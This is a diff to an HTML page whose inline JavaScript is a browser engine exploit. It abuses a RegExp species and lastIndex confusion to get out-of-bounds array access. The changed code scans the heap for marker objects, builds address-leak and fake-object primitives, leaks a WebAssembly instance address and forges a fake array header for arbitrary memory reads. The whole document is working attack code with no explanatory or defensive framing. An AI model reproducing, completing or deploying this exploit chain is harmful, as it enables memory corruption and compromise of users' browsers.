@@ -1,4 +1,5 @@
-<!doctype html><html><head><meta charset="utf-8"><title>P25</title></head>
+<!doctype html>
+<html><head><meta charset="utf-8"><title>P25</title></head>
 <body><pre id="out">Running...</pre>
 <script>
 "use strict";
@@ -11,12 +12,15 @@ function f2i(f){f64[0]=f;return u64[0];}
 function w2f(lo,hi){u32[0]=lo>>>0;u32[1]=hi>>>0;return f64[0];}
 function trash(n){for(let i=0;i<n;i++)new Array(0x400).fill(1.1);}
 const DMAP=0x1032a5d,EMPTY=0x7e5,MAXS=0x7fdffffe;
-const PINS=[0x1080011,0x1100011];
+const PINS=[0x1080011];
 const dblA=new Array(0x8000);for(let i=0;i<dblA.length;i++)dblA[i]=10.125+i*0.001;
-const objB=new Array(0x8000);for(let i=0;i<objB.length;i++)objB[i]=null;
+const marker={mmm:1};
+const objB=new Array(0x8000);
+objB[0]=marker;objB[1]=marker;objB[2]=marker;objB[3]=marker;
 const wasmI=new WebAssembly.Instance(new WebAssembly.Module(
   new Uint8Array([0,97,115,109,1,0,0,0,1,5,1,96,0,1,127,3,2,1,0,7,5,1,1,102,0,0,10,6,1,4,0,65,42,11])));
-objB[0]=wasmI;
+objB[4]=wasmI;
+const victim=[1.22,1.33,1.44];
 const re=/(?:)/;
 const fk={flags:"g",lastIndex:1073741823,constructor:{[Symbol.species]:function(){return re;}}};
 const c0=w2f(DMAP,EMPTY);
@@ -40,45 +44,56 @@ const m=re.lastIndex;
 log("T: "+typeof m+" A="+Array.isArray(m));
 if(Array.isArray(m)){
   log("L: "+m.length);
-  // m[0] tells us which PIN materialized
-  log("M0: "+f2i(m[0]).toString(16));
-  // Search for pinnedDoubles data: 10.125 = 0x4024400000000000
-  const SENTINEL=0x4024400000000000n;
-  let found=-1;
-  // Scan ONLY the committed page: k=0 to k=0x7FF0 (256KB)
-  for(let k=0;k<0x7FF0;k++){
-    if(f2i(m[k])===SENTINEL){found=k;break;}
-  }
-  if(found>=0){
-    log("PD@"+found.toString(16));
-    // Verify: next value should be 10.126 = dblA[1]
-    const next=m[found+1];
-    log("PD1: "+next);
-    // Now search for header pattern before found
-    const tgt1=0x7fdffffe01080011n;
-    const tgt2=0x7fdffffe01100011n;
-    let hdr=-1;
-    for(const off of [found-1,found-2,found+0x7FFF,found+0x8000,found+0x8001]){
-      if(off>=0&&off<MAXS){
-        try{
-          const v=f2i(m[off]);
-          if(v===tgt1||v===tgt2){hdr=off;break;}
-        }catch(e){}
+  const d=[];
+  for(let k=0;k<8;k++){try{d.push(f2i(m[k]).toString(16));}catch(e){d.push("E");break;}}
+  log("H0: "+d.join(","));
+  // Also probe dblA: if m[k] were dblA, m[0] would have been 10.125 (it's not)
+  // Scan SAFE window m[0..0x7000] for marker pattern (lo==hi odd pairs)
+  let OB=-1;
+  for(let k=0;k<0x7000;k++){
+    try{
+      const v=f2i(m[k]);const lo=v&0xffffffffn,hi=v>>32n;
+      if(lo===hi&&(lo&1n)===1n&&lo>0x1000n&&lo<0x2000000n){
+        objB[5]=marker;
+        if((f2i(m[k])>>32n)===lo){OB=k;break;}
       }
-    }
-    log("HDR: "+(hdr>=0?hdr.toString(16):"NO"));
-  }else{
-    log("PD_NOT_IN_PAGE");
-    // Also search for header in known spots
-    const tgt1=0x7fdffffe01080011n;
-    let h=-1;
-    for(const k of [3,5,7,0x800F]){
-      try{if(f2i(m[k])===tgt1){h=k;break;}}catch(e){}
-    }
-    log("H: "+(h>=0?h.toString(16):"NO"));
+    }catch(e){log("STOP:"+k.toString(16));break;}
   }
+  if(OB>=0){
+    log("OB:"+OB.toString(16));
+    objB[4]=wasmI;
+    log("WASM:"+(f2i(m[OB+2])&0xffffffffn).toString(16));
+    objB[4]=marker;
+    // FAKEOBJ roundtrip ONLY (no fake array, no ES)
+    objB[4]=wasmI;
+    const raw=f2i(m[OB+2]);
+    m[OB+2]=i2f(raw);
+    const fo=objB[4];
+    const foOk=(!!fo&&!!fo.exports&&fo.exports.f()===42);
+    objB[4]=marker;
+    const wasmAddr=f2i(m[OB+2])&0xffffffffn;
+    // fake array header in objB slots 16-19, deref slot24, read wasmI's first qword
+    m[OB+8]=i2f((BigInt(EMPTY)<<32n)|BigInt(DMAP));
+    m[OB+9]=i2f((6n<<32n)|((wasmAddr-8n+1n)&0xffffffffn));
+    const fakeAddr=BigInt(0x1080018+(OB+8)*8+1);
+    // write fakeAddr into slot8 (m[OB+4] LO32) — even slot = lo half
+    const raw4=f2i(m[OB+4]);
+    m[OB+4]=i2f((raw4>>32n<<32n)|BigInt(0x1080018+(OB+8)*8+1));
+    const wv=f2i(m[OB+4]); // verify write landed
+    const fa=objB[8];
+    let hr="E", tp=typeof fa;
+    try{hr=f2i(fa[0]).toString(16);}catch(e){hr="E:"+e.message;}
+    // restore
+    m[OB+4]=i2f(raw4);
+    m[OB+8]=i2f(0x0000001100000011n);
+    m[OB+9]=i2f(0x0000001100000011n);
+    log("FO:"+foOk);
+    log("WMAP:"+hr+" tp:"+tp+" wv:"+wv.toString(16));
+    log("CHAIN_DONE");
+  }else{log("MARKER_MISS");}
   log("W: "+wasmI.exports.f());
-}else{log("NA");}
+}else if(typeof m==="number"){log("N: "+f2i(m).toString(16));}
+else{log("OBJ:"+typeof m);}
 }catch(e){log("E: "+e.message);}
 log("=== DONE ===");
 </script></body></html>
